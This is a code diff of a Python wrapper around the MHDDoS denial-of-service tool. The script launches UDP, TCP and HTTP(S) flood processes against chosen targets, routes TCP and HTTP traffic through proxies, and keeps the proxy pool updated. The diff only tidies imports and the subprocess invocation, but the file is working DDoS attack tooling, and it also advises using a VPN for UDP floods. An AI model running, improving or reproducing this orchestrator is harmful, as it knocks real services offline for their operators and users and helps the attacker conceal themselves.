@@ -4,12 +4,12 @@ import multiprocessing
 import os
 import random
 import subprocess
+import sys
 import time
 
+from MHDDoS.start import ProxyManager
 from PyRoxy import ProxyChecker
 from PyRoxy import ProxyType
-
-from MHDDoS.start import ProxyManager
 
 
 def update_proxies(period, proxy_timeout, threads, targets):
@@ -58,8 +58,7 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
         if target.lower().startswith('udp://'):
             print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
             params_list.append([
-                'python3', 'start.py', 'UDP', target[6:],
-                str(udp_threads), str(period)
+                'UDP', target[6:], str(udp_threads), str(period)
             ])
 
         # TCP
@@ -69,23 +68,23 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
                 ('5', 'socks5.txt', threads_per_target // 2),
             ):
                 params_list.append([
-                    'python3', 'start.py', 'TCP', target[6:],
-                    str(threads), str(period), socks_type, socks_file
+                    'TCP', target[6:], str(threads), str(period), socks_type, socks_file
                 ])
 
         # HTTP(S)
         else:
             method = random.choice(http_methods)
             params_list.append([
-                'python3', 'start.py', method, target,
-                '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)
+                method, target, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)
             ])
 
     processes = []
     for params in params_list:
         if debug:
             params.append('true')
-        processes.append(subprocess.Popen(params))
+        processes.append(
+            subprocess.Popen([sys.executable, './start.py', *params])
+        )
 
     for p in processes:
         p.wait()
